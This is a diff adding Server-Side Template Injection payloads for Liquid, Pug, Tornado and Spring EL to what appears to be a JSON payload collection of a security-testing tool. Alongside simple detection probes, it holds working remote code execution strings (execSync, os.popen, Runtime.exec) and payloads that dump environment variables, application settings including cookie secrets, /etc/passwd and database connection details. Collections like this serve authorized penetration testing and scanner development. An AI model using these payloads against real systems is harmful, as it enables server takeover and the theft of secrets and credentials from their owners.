@@ -129,6 +129,46 @@
         {"payload": "{{printf \"%v\" .}}", "description": "Verbose data dump — prints all template data with Go default formatting", "waf_bypass": false},
         {"payload": "{{html \"<script>alert(1)</script>\"}}", "description": "XSS via html function in text/template — html/template auto-escapes but text/template does not", "waf_bypass": false}
       ]
+    },
+    "liquid": {
+      "description": "Server-Side Template Injection payloads for Liquid (Shopify, Jekyll, Ruby/Node)",
+      "payloads": [
+        {"payload": "{{7 | plus: 7}}", "description": "Basic arithmetic probe via Liquid filter (14 confirms SSTI)", "waf_bypass": false},
+        {"payload": "{{ 'now' | date: '%Y-%m-%d' }}", "description": "Date filter probe — confirms Liquid engine by rendering current date", "waf_bypass": false},
+        {"payload": "{% assign x = 'SSTI_PROBE' %}{{x}}", "description": "Variable assignment probe — confirms server-side execution", "waf_bypass": false},
+        {"payload": "{{ page | json }}", "description": "Dump page object as JSON (Jekyll) — may leak config or metadata", "waf_bypass": false},
+        {"payload": "{{ site.data | inspect }}", "description": "Dump site data (Jekyll) — may expose _data directory contents", "waf_bypass": false},
+        {"payload": "{% include '/etc/passwd' %}", "description": "File inclusion via include tag — works if Liquid configured with filesystem access", "waf_bypass": false},
+        {"payload": "{{ '' | url_encode | prepend: 'SSTI_' | append: '_CONFIRMED' }}", "description": "String manipulation probe via filters — Liquid-specific filter chain", "waf_bypass": false}
+      ]
+    },
+    "pug": {
+      "description": "Server-Side Template Injection payloads for Pug/Jade (Node.js)",
+      "payloads": [
+        {"payload": "#{7*7}", "description": "Basic arithmetic probe for Pug interpolation (49 confirms SSTI)", "waf_bypass": false},
+        {"payload": "#{global.process.mainModule.require('child_process').execSync('id')}", "description": "RCE via process.mainModule require chain — Pug evaluates interpolation server-side", "waf_bypass": false},
+        {"payload": "#{global.process.env}", "description": "Environment variable dump via process.env", "waf_bypass": false},
+        {"payload": "#{JSON.stringify(global.process.versions)}", "description": "Node.js version disclosure for targeted exploitation", "waf_bypass": false}
+      ]
+    },
+    "tornado": {
+      "description": "Server-Side Template Injection payloads for Tornado (Python)",
+      "payloads": [
+        {"payload": "{{7*7}}", "description": "Basic arithmetic probe — Tornado uses same {{ }} syntax", "waf_bypass": false},
+        {"payload": "{% import os %}{{os.popen('id').read()}}", "description": "RCE via Tornado template import + os.popen", "waf_bypass": false},
+        {"payload": "{{handler.settings}}", "description": "Dump Tornado application settings — may leak cookie_secret and debug flag", "waf_bypass": false},
+        {"payload": "{{handler.application.settings}}", "description": "Alternative settings dump via application object", "waf_bypass": false}
+      ]
+    },
+    "spring_el": {
+      "description": "Spring Expression Language (SpEL) injection payloads for Java Spring applications",
+      "payloads": [
+        {"payload": "${7*7}", "description": "Basic SpEL arithmetic probe (49 confirms injection)", "waf_bypass": false},
+        {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "description": "RCE via Runtime.exec — classic SpEL RCE chain", "waf_bypass": false},
+        {"payload": "${T(java.lang.System).getenv()}", "description": "Environment variable dump via System.getenv", "waf_bypass": false},
+        {"payload": "${applicationContext.getBean('dataSource').getConnection().getMetaData().getURL()}", "description": "Database connection URL extraction via Spring bean", "waf_bypass": false},
+        {"payload": "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}", "description": "RCE with stdout capture via commons-io IOUtils", "waf_bypass": false}
+      ]
     }
   }
 }
